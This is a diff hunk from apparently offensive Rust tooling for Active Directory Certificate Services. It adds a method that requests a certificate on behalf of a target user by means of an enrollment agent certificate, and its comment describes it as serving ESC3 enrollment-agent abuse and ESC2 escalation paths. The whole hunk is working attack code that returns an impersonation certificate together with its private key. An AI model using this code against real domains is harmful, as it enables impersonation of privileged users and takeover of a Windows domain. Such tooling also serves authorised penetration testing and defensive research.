@@ -663,6 +663,53 @@ impl AdcsClient {
         })
     }
 
+    /// Request a certificate on behalf of another user using an enrollment agent certificate.
+    /// Used for ESC3 (Enrollment Agent abuse) and ESC2 escalation paths.
+    pub async fn request_certificate_on_behalf(
+        &self,
+        subject_cn: &str,
+        template: &str,
+        target_upn: &str,
+        agent_cert_der: &[u8],
+    ) -> Result<IssuedCertificate> {
+        info!(
+            "Requesting certificate on behalf of {} for template {}",
+            target_upn, template
+        );
+
+        let (csr_der, private_key) = create_client_auth_csr(subject_cn, template, None)?;
+
+        let response = self
+            .web_client
+            .submit_request_on_behalf(&csr_der, template, target_upn, agent_cert_der)
+            .await?;
+
+        if !response.is_issued() {
+            return Err(OverthroneError::CertificateRequest(format!(
+                "On-behalf request failed: {}",
+                response.message
+            )));
+        }
+
+        let cert_data = response
+            .certificate
+            .ok_or_else(|| OverthroneError::Adcs("No certificate in response".to_string()))?;
+
+        Ok(IssuedCertificate {
+            pfx_data: cert_data.clone(),
+            thumbprint: compute_thumbprint(&cert_data),
+            serial_number: extract_serial(&cert_data).unwrap_or_default(),
+            valid_from: "Unknown".to_string(),
+            valid_to: "Unknown".to_string(),
+            template: template.to_string(),
+            subject: format!("CN={}", subject_cn),
+            issuer: self.web_client.base_url(),
+            public_key_algorithm: "RSA".to_string(),
+            signature_algorithm: "SHA256RSA".to_string(),
+            private_key_pem: private_key,
+        })
+    }
+
     // ─────────────────────────────────────────────────────────
     // Enumeration
     // ─────────────────────────────────────────────────────────
